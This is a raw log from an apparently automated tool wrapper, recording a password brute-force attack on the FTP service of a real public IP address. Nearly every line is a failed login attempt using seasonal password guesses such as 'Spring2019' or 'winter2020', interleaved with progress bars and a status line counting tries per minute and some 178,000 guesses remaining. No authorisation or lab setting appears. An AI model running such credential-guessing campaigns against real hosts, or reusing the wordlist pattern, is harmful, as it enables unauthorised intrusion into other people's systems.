2025-10-24 01:36:30,174 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Fall2021 (Incorrect: )
2025-10-24 01:36:30,367 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.4%[0m ETA: 142.9s Speed: 3 B/s | 157.1s | PID: 44124
2025-10-24 01:36:30,699 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :fall2021 (Incorrect: )
2025-10-24 01:36:30,750 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.5%[0m ETA: 277.6s Speed: 55 B/s | 22.4s | PID: 44299
2025-10-24 01:36:31,168 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.6%[0m ETA: 142.1s Speed: 3 B/s | 157.9s | PID: 44124
2025-10-24 01:36:31,223 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2021 (Incorrect: )
2025-10-24 01:36:31,551 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m7.7%[0m ETA: 276.8s Speed: 58 B/s | 23.2s | PID: 44299
2025-10-24 01:36:31,749 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2021 (Incorrect: )
2025-10-24 01:36:31,969 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.9%[0m ETA: 141.3s Speed: 3 B/s | 158.7s | PID: 44124
2025-10-24 01:36:32,267 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2020 (Incorrect: )
2025-10-24 01:36:32,352 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.0%[0m ETA: 276.0s Speed: 64 B/s | 24.0s | PID: 44299
2025-10-24 01:36:32,770 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m53.2%[0m ETA: 140.5s Speed: 3 B/s | 159.5s | PID: 44124
2025-10-24 01:36:32,826 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2020 (Incorrect: )
2025-10-24 01:36:33,153 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.3%[0m ETA: 275.2s Speed: 66 B/s | 24.8s | PID: 44299
2025-10-24 01:36:33,345 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2020 (Incorrect: )
2025-10-24 01:36:33,571 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m53.4%[0m ETA: 139.7s Speed: 3 B/s | 160.3s | PID: 44124
2025-10-24 01:36:33,864 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2020 (Incorrect: )
2025-10-24 01:36:33,954 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.5%[0m ETA: 274.4s Speed: 72 B/s | 25.6s | PID: 44299
2025-10-24 01:36:34,372 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m53.7%[0m ETA: 138.9s Speed: 3 B/s | 161.1s | PID: 44124
2025-10-24 01:36:34,418 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2020 (Incorrect: )
2025-10-24 01:36:34,755 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m8.8%[0m ETA: 273.6s Speed: 73 B/s | 26.4s | PID: 44299
2025-10-24 01:36:34,937 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2020 (Incorrect: )
2025-10-24 01:36:35,172 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.0%[0m ETA: 138.1s Speed: 3 B/s | 161.9s | PID: 44124
2025-10-24 01:36:35,480 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Fall2020 (Incorrect: )
2025-10-24 01:36:35,557 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.1%[0m ETA: 272.8s Speed: 79 B/s | 27.2s | PID: 44299
2025-10-24 01:36:35,973 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.2%[0m ETA: 137.3s Speed: 3 B/s | 162.7s | PID: 44124
2025-10-24 01:36:36,007 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :fall2020 (Incorrect: )
2025-10-24 01:36:36,360 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.3%[0m ETA: 272.0s Speed: 80 B/s | 28.0s | PID: 44299
2025-10-24 01:36:36,527 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2020 (Incorrect: )
2025-10-24 01:36:36,774 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.5%[0m ETA: 136.5s Speed: 3 B/s | 163.5s | PID: 44124
2025-10-24 01:36:37,093 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2020 (Incorrect: )
2025-10-24 01:36:37,161 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.6%[0m ETA: 271.2s Speed: 85 B/s | 28.8s | PID: 44299
2025-10-24 01:36:37,574 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.8%[0m ETA: 135.7s Speed: 3 B/s | 164.3s | PID: 44124
2025-10-24 01:36:37,628 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2019 (Incorrect: )
2025-10-24 01:36:37,962 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m9.9%[0m ETA: 270.4s Speed: 86 B/s | 29.6s | PID: 44299
2025-10-24 01:36:38,172 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2019 (Incorrect: )
2025-10-24 01:36:38,375 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.0%[0m ETA: 134.9s Speed: 3 B/s | 165.1s | PID: 44124
2025-10-24 01:36:38,693 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2019 (Incorrect: )
2025-10-24 01:36:38,766 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.1%[0m ETA: 269.6s Speed: 90 B/s | 30.4s | PID: 44299
2025-10-24 01:36:39,175 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.3%[0m ETA: 134.1s Speed: 3 B/s | 165.9s | PID: 44124
2025-10-24 01:36:39,211 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2019 (Incorrect: )
2025-10-24 01:36:39,568 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.4%[0m ETA: 268.8s Speed: 91 B/s | 31.2s | PID: 44299
2025-10-24 01:36:39,744 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2019 (Incorrect: )
2025-10-24 01:36:39,976 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.6%[0m ETA: 133.3s Speed: 3 B/s | 166.7s | PID: 44124
2025-10-24 01:36:40,296 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2019 (Incorrect: )
2025-10-24 01:36:40,370 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.7%[0m ETA: 268.0s Speed: 95 B/s | 32.0s | PID: 44299
2025-10-24 01:36:40,776 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.8%[0m ETA: 132.5s Speed: 3 B/s | 167.5s | PID: 44124
2025-10-24 01:36:40,817 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Fall2019 (Incorrect: )
2025-10-24 01:36:41,171 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m10.9%[0m ETA: 267.2s Speed: 95 B/s | 32.8s | PID: 44299
2025-10-24 01:36:41,337 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :fall2019 (Incorrect: )
2025-10-24 01:36:41,577 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.1%[0m ETA: 131.7s Speed: 3 B/s | 168.3s | PID: 44124
2025-10-24 01:36:41,860 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2019 (Incorrect: )
2025-10-24 01:36:41,972 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.2%[0m ETA: 266.4s Speed: 99 B/s | 33.6s | PID: 44299
2025-10-24 01:36:42,377 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.4%[0m ETA: 130.9s Speed: 3 B/s | 169.1s | PID: 44124
2025-10-24 01:36:42,390 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2019 (Incorrect: )
2025-10-24 01:36:42,773 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.5%[0m ETA: 265.6s Speed: 100 B/s | 34.4s | PID: 44299
2025-10-24 01:36:42,984 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2018 (Incorrect: )
2025-10-24 01:36:43,179 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.6%[0m ETA: 130.1s Speed: 3 B/s | 169.9s | PID: 44124
2025-10-24 01:36:43,513 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2018 (Incorrect: )
2025-10-24 01:36:43,575 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m11.7%[0m ETA: 264.8s Speed: 103 B/s | 35.2s | PID: 44299
2025-10-24 01:36:43,980 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m56.9%[0m ETA: 129.3s Speed: 3 B/s | 170.7s | PID: 44124
2025-10-24 01:36:44,036 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2018 (Incorrect: )
2025-10-24 01:36:44,377 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.0%[0m ETA: 263.9s Speed: 104 B/s | 36.1s | PID: 44299
2025-10-24 01:36:44,580 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2018 (Incorrect: )
2025-10-24 01:36:44,782 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.2%[0m ETA: 128.5s Speed: 3 B/s | 171.5s | PID: 44124
2025-10-24 01:36:45,172 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2018 (Incorrect: )
2025-10-24 01:36:45,179 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.3%[0m ETA: 263.1s Speed: 107 B/s | 36.9s | PID: 44299
2025-10-24 01:36:45,583 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.4%[0m ETA: 127.7s Speed: 3 B/s | 172.3s | PID: 44124
2025-10-24 01:36:45,757 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2018 (Incorrect: )
2025-10-24 01:36:45,985 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.6%[0m ETA: 262.3s Speed: 107 B/s | 37.7s | PID: 44299
2025-10-24 01:36:46,310 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Fall2018 (Incorrect: )
2025-10-24 01:36:46,383 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.7%[0m ETA: 126.9s Speed: 3 B/s | 173.1s | PID: 44124
2025-10-24 01:36:46,785 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m12.8%[0m ETA: 261.5s Speed: 107 B/s | 38.5s | PID: 44299
2025-10-24 01:36:46,836 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :fall2018 (Incorrect: )
2025-10-24 01:36:47,184 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.0%[0m ETA: 126.1s Speed: 3 B/s | 173.9s | PID: 44124
2025-10-24 01:36:47,373 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2018 (Incorrect: )
2025-10-24 01:36:47,586 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.1%[0m ETA: 260.7s Speed: 110 B/s | 39.3s | PID: 44299
2025-10-24 01:36:47,897 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2018 (Incorrect: )
2025-10-24 01:36:47,985 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.2%[0m ETA: 125.3s Speed: 3 B/s | 174.7s | PID: 44124
2025-10-24 01:36:48,388 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.4%[0m ETA: 259.9s Speed: 111 B/s | 40.1s | PID: 44299
2025-10-24 01:36:48,427 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2016 (Incorrect: )
2025-10-24 01:36:48,786 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.5%[0m ETA: 124.5s Speed: 3 B/s | 175.5s | PID: 44124
2025-10-24 01:36:49,018 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2015 (Incorrect: )
2025-10-24 01:36:49,188 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.6%[0m ETA: 259.1s Speed: 113 B/s | 40.9s | PID: 44299
2025-10-24 01:36:49,565 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2014 (Incorrect: )
2025-10-24 01:36:49,586 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.8%[0m ETA: 123.7s Speed: 3 B/s | 176.3s | PID: 44124
2025-10-24 01:36:49,990 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m13.9%[0m ETA: 258.3s Speed: 114 B/s | 41.7s | PID: 44299
2025-10-24 01:36:50,103 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Spring2013 (Incorrect: )
2025-10-24 01:36:50,387 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.0%[0m ETA: 122.9s Speed: 3 B/s | 177.1s | PID: 44124
2025-10-24 01:36:50,635 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2017 (Incorrect: )
2025-10-24 01:36:50,791 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.2%[0m ETA: 257.5s Speed: 116 B/s | 42.5s | PID: 44299
2025-10-24 01:36:51,157 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2016 (Incorrect: )
2025-10-24 01:36:51,187 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.3%[0m ETA: 122.1s Speed: 3 B/s | 177.9s | PID: 44124
2025-10-24 01:36:51,592 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.4%[0m ETA: 256.7s Speed: 116 B/s | 43.3s | PID: 44299
2025-10-24 01:36:51,679 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2015 (Incorrect: )
2025-10-24 01:36:51,988 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.6%[0m ETA: 121.3s Speed: 3 B/s | 178.7s | PID: 44124
2025-10-24 01:36:52,205 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2014 (Incorrect: )
2025-10-24 01:36:52,393 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m14.7%[0m ETA: 255.9s Speed: 119 B/s | 44.1s | PID: 44299
2025-10-24 01:36:52,739 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :spring2013 (Incorrect: )
2025-10-24 01:36:52,789 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.8%[0m ETA: 120.5s Speed: 3 B/s | 179.5s | PID: 44124
2025-10-24 01:36:53,195 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.0%[0m ETA: 255.1s Speed: 119 B/s | 44.9s | PID: 44299
2025-10-24 01:36:53,214 - __main__ - INFO - 📤 STDOUT: [STATUS] 146.67 tries/min, 440 tries in 00:03h, 178235 to do in 20:16h, 4 active
2025-10-24 01:36:53,308 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2017 (Incorrect: )
2025-10-24 01:36:53,590 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.1%[0m ETA: 119.7s Speed: 3 B/s | 180.3s | PID: 44124
2025-10-24 01:36:53,835 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2016 (Incorrect: )
2025-10-24 01:36:53,995 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.2%[0m ETA: 254.3s Speed: 121 B/s | 45.7s | PID: 44299
2025-10-24 01:36:54,391 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.4%[0m ETA: 118.9s Speed: 3 B/s | 181.1s | PID: 44124
2025-10-24 01:36:54,418 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2015 (Incorrect: )
2025-10-24 01:36:54,796 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.5%[0m ETA: 253.5s Speed: 121 B/s | 46.5s | PID: 44299
2025-10-24 01:36:54,972 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2014 (Incorrect: )
2025-10-24 01:36:55,192 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.6%[0m ETA: 118.1s Speed: 3 B/s | 181.9s | PID: 44124
2025-10-24 01:36:55,529 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2013 (Incorrect: )
2025-10-24 01:36:55,598 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m15.8%[0m ETA: 252.7s Speed: 123 B/s | 47.3s | PID: 44299
2025-10-24 01:36:55,993 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.9%[0m ETA: 117.3s Speed: 3 B/s | 182.7s | PID: 44124
2025-10-24 01:36:56,079 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2017 (Incorrect: )
2025-10-24 01:36:56,399 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.0%[0m ETA: 251.9s Speed: 123 B/s | 48.1s | PID: 44299
2025-10-24 01:36:56,651 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2016 (Incorrect: )
2025-10-24 01:36:56,794 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.2%[0m ETA: 116.5s Speed: 3 B/s | 183.5s | PID: 44124
2025-10-24 01:36:57,197 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2015 (Incorrect: )
2025-10-24 01:36:57,201 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.3%[0m ETA: 251.1s Speed: 125 B/s | 48.9s | PID: 44299
2025-10-24 01:36:57,598 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.4%[0m ETA: 115.7s Speed: 3 B/s | 184.3s | PID: 44124
2025-10-24 01:36:57,722 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2014 (Incorrect: )
2025-10-24 01:36:58,002 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.6%[0m ETA: 250.3s Speed: 125 B/s | 49.7s | PID: 44299
2025-10-24 01:36:58,245 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2013 (Incorrect: )
2025-10-24 01:36:58,399 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.7%[0m ETA: 114.9s Speed: 3 B/s | 185.1s | PID: 44124
2025-10-24 01:36:58,804 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m16.8%[0m ETA: 249.5s Speed: 125 B/s | 50.5s | PID: 44299
2025-10-24 01:36:58,811 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2017 (Incorrect: )
2025-10-24 01:36:59,200 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.0%[0m ETA: 114.1s Speed: 3 B/s | 185.9s | PID: 44124
2025-10-24 01:36:59,349 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2016 (Incorrect: )
2025-10-24 01:36:59,605 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.1%[0m ETA: 248.7s Speed: 127 B/s | 51.3s | PID: 44299
